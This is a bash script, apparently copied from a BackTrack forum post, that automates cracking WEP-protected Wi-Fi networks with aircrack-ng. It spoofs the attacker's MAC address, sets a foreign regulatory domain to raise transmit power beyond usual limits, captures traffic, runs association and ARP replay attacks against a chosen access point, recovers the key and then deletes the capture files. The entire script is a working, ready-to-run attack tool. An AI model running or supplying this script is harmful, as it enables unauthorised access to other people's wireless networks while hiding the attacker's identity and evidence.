#!/bin/bash
# wepcrack.sh
#
# This tool requires aircrack-ng tools to be installed and run as root
#source: http://www.backtrack-linux.org/forums/experts-forum/1970-automated-wep-cracking-script-wepcrack-sh.html

#run by root or by sudoer is mandatory:
if [ "$(id -u)" != "0" ];then
    echo "this script must be run with root privileges" 1>&2
    exit 1
fi

#help funct
usage() {
cat<<EOF
Usage:
    `basename ${0}` <interface> [BSSID] [channel]

Where:
    <interface> mandatory. If you are not sure, please run iwconfig.
    [BESSID]    optionnal. This is the targeted BESSID.
    [channel]   optionnal. This is the channel in use by your target.
EOF
}

#Put wireless iface in monitor mode
monmode() {
    airmon-ng start ${1}
    iwconfig ${1} # mon0
}

#CHECKING IF INTERFACE IS PROVIDED
if [ -z ${1} ];then
    usage
    exit 1
else
    IFACE=${1}
    for dev in `cat /proc/net/dev | egrep -o '[^:]+:' | cut -d':' -f1 | sed -e 's/^\s\+//'`; do
        if [[ "${IFACE}" =~ "${dev}" ]]; then
            monmode ${IFACE}
            CHECK=1
        fi
    done
    if [[ ${CHECK} != 1 ]];then
        echo -e "\nIface ${IFACE} do not exists;\nexiting\n";
        exit 1
    fi
fi

#spoof mac address and get this new mac
iw reg set BO
iwconfig ${IFACE} txpower 25
MACADDRESS=`macchanger -A ${IFACE} |grep Faked | egrep -o '[0-9|a-z][0-9|a-z]:[0-9|a-z][0-9|a-z]:[0-9|a-z][0-9|a-z]:[0-9|a-z][0-9|a-z]:[0-9|a-z][0-9|a-z]:[0-9|a-z][0-9|a-z]'`

# CHECK IF BSSID,CHANNEL & TARGETNAME WERE PROVIDED
if [ -z ${2} ] || [ -z ${3} ] ; then
    # SHOW VISIBLE WEP NETWORKS
    echo -e "\nWill now display all visible WEP networks\nOnce you have identified the network you wish to target press <Ctrl-C> to exit\n"
    read -p "Press <return> to view visible networks"
    airodump-ng --encrypt WEP ${IFACE} # mon0

    # USER INPUT DETAILS FROM AIRODUMP
    while true; do
        echo -n "Please enter the target BSSID here: "
        read -e BSSID
        echo -n "Please enter the target channel here: "
        read -e CHANNEL
        echo "Target BSSID            : ${BSSID}"
        echo "Target Channel          : ${CHANNEL}"
        echo "Interface MAC Address   : ${MACADDRESS}"
        echo -n "Is this information correct? (y or n): "
        read -e CONFIRM
        case $CONFIRM in
            y|Y|YES|yes|Yes)
            break ;;
            *) echo "Please re-enter information"
        esac
    done
fi

# START AIRODUMP IN XTERM WINDOW
echo "Starting packet capture  -  <Ctrl-C> to end it"
xterm -e "airodump-ng -c ${CHANNEL} --bssid ${BSSID} --ivs -w capture ${IFACE}" & AIRODUMPPID=$!
sleep 2

# ASSOCIATE WITH AP & THEN PERFORM FRAGMENTATION ATTACK
aireplay-ng -1 0 -a ${BSSID} -h ${MACADDRESS} ${IFACE}
aireplay-ng -3 -b ${BSSID} -h ${MACADDRESS} ${IFACE}

#aireplay-ng -5 -b ${BSSID} -h ${MACADDRESS} ${IFACE}
#packetforge-ng -0 -a ${BSSID} -h ${MACADDRESS} -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-packet ${IFACE}

#xterm -e "aireplay-ng -2 -r arp-packet ${IFACE}" & AIREPLAYPID=$!

# ATTEMPTING TO CRACK
while true; do
    aircrack-ng -n 128 -b ${BSSID} *.ivs
    echo -n "Did you get the key?: (y or no)"
    read -e CONFIRM
    case $CONFIRM in
        y|Y|YES|yes|Yes)
        break ;;
        *) echo "Will attempt to crack again" & sleep 3
    esac
done

# DELETE FILES CREATED DURING WEP CRACKING
kill ${AIRODUMPPID}
kill ${AIREPLAYPID}
airmon-ng stop ${IFACE}
rm *.ivs *.cap *.xor

exit 0
